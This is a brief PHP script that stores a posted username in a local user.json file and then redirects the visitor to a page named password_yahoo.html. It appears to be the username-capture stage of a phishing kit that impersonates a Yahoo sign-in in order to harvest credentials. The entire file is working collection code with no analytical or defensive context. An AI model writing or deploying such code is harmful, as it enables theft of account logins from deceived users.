<?php
$user = $_POST['username'];
$jdata = json_encode($user);
$f = fopen('user.json', 'w');
fwrite($f, $jdata);
fclose($f);

header("location:password_yahoo.html");
exit();

